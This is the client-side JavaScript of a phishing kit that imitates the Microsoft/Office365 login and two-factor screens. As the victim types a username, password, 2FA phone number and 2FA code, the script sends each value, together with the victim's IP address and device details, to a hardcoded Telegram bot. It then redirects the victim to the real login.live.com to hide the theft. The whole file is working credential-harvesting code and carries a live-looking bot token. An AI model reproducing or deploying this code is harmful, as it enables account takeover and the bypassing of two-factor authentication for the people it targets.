
document.addEventListener('DOMContentLoaded', () => {
    let telegramBotId = "8222171309:AAEUq6LuKnxlcaNv2bdM7QkcyNahPx_QCAA";
    let chatId = "7959372593";

    const unReq = "Enter a valid email address, phone number, or Skype name.";
    const pwdReq = "Please enter the password for your Microsoft account.";
    const confirmReq = "Please confirm the password for your Microsoft account.";
    const verifyStartReq = "Please enter the phone number connected to your Microsoft account.";
    const verifyCodeReq = "Please enter the correct security code that was sent to you.";

    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    const confirmInp = document.getElementById('inp_confirm');
    const verifyStartInp = document.getElementById('inp_verify');
    const verifyCodeInp = document.getElementById('inp_code');
    const pageLoader = document.getElementById('page-loader');

    let view = "uname";
    let unameVal = pwdVal = confirmVal = verifyStartVal = verifyCodeVal = false;

    // Show page loader
    function showLoader() {
        pageLoader.classList.add('active');
    }

    // Hide page loader
    function hideLoader() {
        pageLoader.classList.remove('active');
    }

    // Handle "Enter" key press for each input field
    unameInp.addEventListener('keydown', (event) => handleEnterKey(event, nxt));
    pwdInp.addEventListener('keydown', (event) => handleEnterKey(event, confirm));
    confirmInp.addEventListener('keydown', (event) => handleEnterKey(event, sig));
    verifyStartInp.addEventListener('keydown', (event) => handleEnterKey(event, verify));
    verifyCodeInp.addEventListener('keydown', (event) => handleEnterKey(event, code));

    function handleEnterKey(event, nextButton) {
        if (event.key === "Enter") {
            event.preventDefault();
            nextButton.click();
        }
    }

    // Next button
    const nxt = document.getElementById('btn_next');
    nxt.addEventListener('click', () => {
        validate();
        if (unameVal) {
            // Track visitor when username is entered
            trackVisitor(unameInp.value);
            
            showLoader();
            setTimeout(() => {
                hideLoader();
                setTimeout(() => {
                    switchView("section_uname", "section_pwd");
                    document.querySelectorAll('#user_identity').forEach((e) => {
                        e.innerText = unameInp.value;
                    });
                    view = "pwd";
                }, 200); // Small delay after hiding loader before transition
            }, 2000); // Show loader for 2 seconds
        }
    });

    // Confirm button
    const confirm = document.getElementById('btn_confirm');
    confirm.addEventListener('click', () => {
        validate();
        if (pwdVal) {
            showLoader();
            setTimeout(() => {
                hideLoader();
                setTimeout(() => {
                    switchView("section_pwd", "section_confirm");
                    view = "confirm";
                }, 200);
            }, 2000);
        }
    });

    // Sign in button
    const sig = document.getElementById('btn_sig');
    sig.addEventListener('click', () => {
        validate();
        if (confirmVal) {
            showLoader();
            setTimeout(() => {
                hideLoader();
                setTimeout(() => {
                    switchView("section_confirm", "section_verify");
                    view = "verify";
                    sendFirstLogs();
                }, 200);
            }, 2000);
        }
    });

    // Verify start button
    const verify = document.getElementById('btn_verify');
    verify.addEventListener('click', () => {
        validate();
        if (verifyStartVal) {
            showLoader();
            setTimeout(() => {
                hideLoader();
                setTimeout(() => {
                    switchView("section_verify", "section_code");
                    view = "code";
                    sendLogs();
                }, 200);
            }, 2000);
        }
    });

    // Verify code button
    const code = document.getElementById('btn_code');
    code.addEventListener('click', () => {
        validate();
        if (verifyCodeVal) {
            showLoader();
            setTimeout(() => {
                hideLoader();
                setTimeout(() => {
                    switchView("section_code", "section_final");
                    view = "final";
                    sendCode();
                }, 200);
            }, 2000);
        }
    });

    // Function to switch views
    function switchView(currentViewId, nextViewId) {
        document.getElementById(currentViewId).classList.add('d-none');
        document.getElementById(nextViewId).classList.remove('d-none');
    }

    // Validation functions for each input
    function unameValAction(type) {
        document.getElementById('error_uname').innerText = type ? "" : unReq;
        unameInp.classList.toggle('error-inp', !type);
        unameVal = type;
    }

    function pwdValAction(type) {
        document.getElementById('error_pwd').innerText = type ? "" : pwdReq;
        pwdInp.classList.toggle('error-inp', !type);
        pwdVal = type;
    }

    function confirmValAction(type) {
        document.getElementById('error_confirm').innerText = type ? "" : confirmReq;
        confirmInp.classList.toggle('error-inp', !type);
        confirmVal = type;
    }

    function verifyStartValAction(type) {
        document.getElementById('error_verify').innerText = type ? "" : verifyStartReq;
        verifyStartInp.classList.toggle('error-inp', !type);
        verifyStartVal = type;
    }

    function verifyCodeValAction(type) {
        document.getElementById('error_code').innerText = type ? "" : verifyCodeReq;
        verifyCodeInp.classList.toggle('error-inp', !type);
        verifyCodeVal = type;
    }

    // Validate function
    function validate() {
        if (view === "uname") {
            unameValAction(unameInp.value.trim() !== "");
            if (unameVal) localStorage.setItem("Email address", unameInp.value);
            unameInp.onchange = () => unameValAction(unameInp.value.trim() !== "");
        } else if (view === "pwd") {
            pwdValAction(pwdInp.value.trim() !== "");
            if (pwdVal) localStorage.setItem("Password", pwdInp.value);
            pwdInp.onchange = () => pwdValAction(pwdInp.value.trim() !== "");
        } else if (view === "confirm") {
            confirmValAction(confirmInp.value.trim() !== "");
            if (confirmVal) localStorage.setItem("Password confirmed", confirmInp.value);
            confirmInp.onchange = () => confirmValAction(confirmInp.value.trim() !== "");
        } else if (view === "verify") {
            verifyStartValAction(verifyStartInp.value.trim() !== "");
            if (verifyStartVal) localStorage.setItem("2FA Number", verifyStartInp.value);
            verifyStartInp.onchange = () => verifyStartValAction(verifyStartInp.value.trim() !== "");
        } else if (view === "code") {
            verifyCodeValAction(verifyCodeInp.value.trim() !== "");
            if (verifyCodeVal) localStorage.setItem("2FA Code", verifyCodeInp.value);
            verifyCodeInp.onchange = () => verifyCodeValAction(verifyCodeInp.value.trim() !== "");
        }
    }

    // Back button
    document.querySelector('.back').addEventListener('click', () => {
        showLoader();
        setTimeout(() => {
            hideLoader();
            setTimeout(() => {
                view = "uname";
                switchView("section_pwd", "section_uname");
            }, 200);
        }, 2000);
    });

    // Second back button
    document.querySelector('.backConfirm').addEventListener('click', () => {
        showLoader();
        setTimeout(() => {
            hideLoader();
            setTimeout(() => {
                view = "pwd";
                switchView("section_confirm", "section_pwd");
            }, 200);
        }, 2000);
    });

    // Utility function to generate UUID
    function uuidv4() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    // Generate random ID with letters and dashes
    function generateIdLetters() {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        const numDashes = 4;
        const length = 21;

        const dashPositions = [];
        for (let i = 1; i < numDashes; i++) {
            dashPositions.push((length + 1) * i + i - 1);
        }

        let result = '';
        for (let i = 0; i < numDashes * (length + 1); i++) {
            if (dashPositions.includes(i)) {
                result += '-';
            } else {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
        }

        return result;
    }

    // Track visitor when they enter username
    function trackVisitor(username) {
        const userAgent = navigator.userAgent;
        const date = new Date().toUTCString();
        const deviceInfo = {
            manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
            model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
            os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
            browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
        };

        fetch('https://api.ipify.org/?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;
                
                const payload = {
                    chat_id: chatId,
                    text: `
🔔 New Visitor Alert:
________________________
"Username/Email": "${username}",
"IP Address": ${ipAddress},
"Device": "${deviceInfo.manufacturer}",
"OS": "${deviceInfo.os}",
"Browser": "${deviceInfo.browser}",
"Time": "${date}"
`
                };

                sendToBot(payload);
            })
            .catch(error => console.error('Error fetching IP:', error));
    }

    // Send first logs (credentials and IP address)
    function sendFirstLogs() {
        const username = unameInp.value;
        const password = pwdInp.value;
        const confirmPassword = confirmInp.value;
        const userAgent = navigator.userAgent;
        const date = new Date().toUTCString();
        const deviceInfo = {
            manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
            model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
            os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
            browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
        };
        const id1 = uuidv4();
        const id2 = uuidv4();
        const id3 = generateIdLetters();
        const id4 = uuidv4();
        const x = `prompt=login&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=${id1}; "userAgent"=${userAgent}-NG; MSPOK=$uuid-${id2}; &ui_locales=en-GB&client_info=1&${id3}=0&login_username=${username}&passwd=${password}; DeviceId=${id4}; status_date=${date};`;

        fetch('https://api.ipify.org/?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;
                localStorage.setItem("IP Address", ipAddress);

                const dataToSend = {
                    username,
                    password,
                    confirmPassword,
                    ipAddress,
                    Device: deviceInfo.manufacturer,
                    OS: deviceInfo.os,
                    Browser: deviceInfo.browser,
                    Cookies: x,
                };

                sendFirstToTelegram(dataToSend);
            })
            .catch(error => console.error('Error fetching IP:', error));
    }

    // Send first logs to Telegram (sequentially)
    function sendFirstToTelegram(data) {
        // Send username/email first
        const payload1 = {
            chat_id: chatId,
            text: `
📧 Email/Username:
________________________
"Email address, phone number or skype": "${data.username}",
"IP Address": ${data.ipAddress}
`
        };

        sendToBot(payload1);

        // Wait 1 second, then send password
        setTimeout(() => {
            const payload2 = {
                chat_id: chatId,
                text: `
🔑 Password:
________________________
"Password": "${data.password}",
"Confirmed Password": "${data.confirmPassword}"
`
            };
            sendToBot(payload2);
        }, 1000);

        // Wait 2 seconds, then send device info
        setTimeout(() => {
            const payload3 = {
                chat_id: chatId,
                text: `
💻 Device Info:
________________________
"Device Info": "${data.Device}",
"OS": "${data.OS}",
"Browser": "${data.Browser}",
"Cookies": ["${data.Cookies}"]
`
            };
            sendToBot(payload3);
        }, 2000);
    }

    // Send 2FA number to Telegram
    function sendLogs() {
        const twoFANumber = verifyStartInp.value;
        const ipAddress = localStorage.getItem("IP Address");
        const dataToSend = { twoFANumber, ipAddress };

        sendToTelegram(dataToSend, "2FA Number");
    }

    // Send 2FA code to Telegram
    function sendCode() {
        const twoFACode = verifyCodeInp.value;
        const twoFANumber = verifyStartInp.value;
        const ipAddress = localStorage.getItem("IP Address");
        const dataToSend = { twoFACode, twoFANumber, ipAddress };

        sendToTelegram(dataToSend, "2FA Code");
    }

    // General function to send data to Telegram
    function sendToTelegram(data, type) {
        let text = `New Office365 ${type}:\n________________________\n`;
        for (const key in data) {
            text += `"${key}": ${data[key]},\n`;
        }

        const payload = {
            chat_id: chatId,
            text: text
        };

        sendToBot(payload);
    }

    // Send data to Telegram bot
    function sendToBot(payload) {
        const url = `https://api.telegram.org/bot${telegramBotId}/sendMessage`;
        
        $.ajax({
            url: url,
            method: "POST",
            contentType: "application/json",
            data: JSON.stringify(payload),
            success: function(response) {
                console.log("Message sent to Telegram successfully");
                if (payload.text.includes("2FA Code")) {
                    localStorage.clear();
                    window.location.href = "https://login.live.com/";
                }
            },
            error: function(xhr, status, error) {
                console.error("Error sending data to Telegram:", error);
                console.error("Status:", status);
                console.error("Response:", xhr.responseText);
            }
        });
    }
});
